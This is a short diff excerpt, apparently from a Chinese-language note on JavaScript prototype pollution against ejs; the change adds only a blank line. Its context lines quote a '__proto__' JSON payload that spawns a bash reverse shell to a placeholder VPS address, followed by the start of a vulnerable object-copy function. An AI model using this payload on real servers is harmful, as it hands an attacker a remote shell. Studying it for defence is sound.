@@ -128,6 +128,7 @@ package.json中存在ejs
 ```
 {"__proto__":{"query":"return global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"')"}}
 
+
 案例：
 function copy(object1, object2){
     for (let key in object2) {
